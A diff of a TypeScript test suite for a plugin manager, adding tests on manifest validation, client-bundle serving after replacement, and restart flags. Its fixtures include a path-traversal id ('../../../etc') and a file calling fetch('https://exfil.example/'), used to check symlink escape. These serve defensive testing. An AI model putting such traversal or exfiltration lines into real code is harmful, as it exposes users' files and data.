@@ -385,6 +385,15 @@ describe("declared vs used", () => {
     expect(f.refusal).toMatch(/built for plugin API ">=99"/);
   });
 
+  it("never turns an INVALID manifest's id into an installed-lookup path", async () => {
+    const dir = await writeDir({ "plugin.yaml": "id: ../../../etc\nname: X\nversion: bad\ndispatch: '>=1'\n" });
+    const asked: string[] = [];
+    const r = await inspectPluginDir(dir, { source: SOURCE, fetched: FETCHED, installed: async (id) => (asked.push(id), { version: "9.9.9" }) });
+    expect(r.valid).toBe(false);
+    expect(asked).toEqual([]);
+    expect(r.installed).toBeUndefined();
+  });
+
   it("does not follow a symlink out of the plugin directory", async () => {
     const outside = await writeDir({ "secret.js": "fetch('https://exfil.example/')" });
     const dir = await writeDir({ "plugin.yaml": "id: s\nname: S\nversion: 1.0.0\ndispatch: '>=1'\nserver: ./src/index.js\n", "src/index.js": "export function activate(ctx) {}\n" });
@@ -425,12 +434,13 @@ describe("scan helpers", () => {
 
 /* ---------------------------------------------------------------- routes */
 
-async function app(fetchDeps: FetchDeps) {
+async function app(fetchDeps: FetchDeps, seed?: (configDir: string) => Promise<void>) {
   const base = await tmp("dispatch-inspect-app-");
   const configDir = join(base, "config");
   const dataDir = join(base, "data");
   await mkdir(join(configDir, "plugins"), { recursive: true });
   await mkdir(dataDir, { recursive: true });
+  await seed?.(configDir);
   let host: { get(id: string): PluginInfo | undefined; noteInstalled(id: string): Promise<PluginInfo | undefined> } | undefined;
   const instance = await buildApp({
     store: new Store(dataDir, configDir),
@@ -494,6 +504,40 @@ describe("POST /api/plugins/inspect + /install", () => {
     expect(invalid.statusCode).toBe(409);
     expect(invalid.json().error).toMatch(/not installable: the manifest is invalid/);
     expect(await readdir(join(configDir, "plugins"))).toEqual([]);
+  });
+
+  it("stops serving an active plugin's client bundle once its files are replaced, until restart", async () => {
+    const manifest = (v: string) => `id: hello-server\nname: H\nversion: ${v}\ndispatch: '>=1'\nclient: ./client/index.js\ncapabilities: [ui]\n`;
+    const seed = async (configDir: string) => {
+      const dir = join(configDir, "plugins", "hello-server");
+      await mkdir(join(dir, "client"), { recursive: true });
+      await writeFile(join(dir, "plugin.yaml"), manifest("0.0.1"));
+      await writeFile(join(dir, "client", "index.js"), "export default { activate() {} };\n");
+    };
+    const { instance } = await app(fakeDeps(exampleRepoTar), seed);
+    await instance.services.plugins.activateAll();
+    const before = ((await instance.inject({ url: "/api/plugins" })).json() as PluginInfo[])[0]!;
+    expect(before).toMatchObject({ status: "active", clientUrl: "/plugins/hello-server/index.js" });
+    expect((await instance.inject({ url: "/plugins/hello-server/index.js" })).statusCode).toBe(200);
+
+    const upd = await instance.inject({ method: "POST", url: "/api/plugins/install", payload: { url, sha: SHA_MAIN, replace: true } });
+    expect(upd.json()).toMatchObject({ outcome: "replaced", plugin: { status: "active", needsRestart: true } });
+    const after = ((await instance.inject({ url: "/api/plugins" })).json() as PluginInfo[])[0]!;
+    expect(after.clientUrl).toBeUndefined();
+    expect((await instance.inject({ url: "/plugins/hello-server/index.js" })).statusCode).toBe(404);
+  });
+
+  it("does not flag a switched-off plugin for restart when its files are replaced", async () => {
+    const seed = async (configDir: string) => {
+      const dir = join(configDir, "plugins", "hello-server");
+      await mkdir(dir, { recursive: true });
+      await writeFile(join(dir, "plugin.yaml"), "id: hello-server\nname: H\nversion: 0.0.1\ndispatch: '>=1'\n");
+      await writeFile(join(configDir, "config.json"), JSON.stringify({ plugins: { "hello-server": { enabled: false } } }));
+    };
+    const { instance } = await app(fakeDeps(exampleRepoTar), seed);
+    const upd = await instance.inject({ method: "POST", url: "/api/plugins/install", payload: { url, sha: SHA_MAIN, replace: true } });
+    expect(upd.json().plugin).toMatchObject({ status: "disabled", enabled: false });
+    expect(upd.json().plugin.needsRestart).toBeUndefined();
   });
 
   it("maps a fetch failure to its status instead of a 500", async () => {
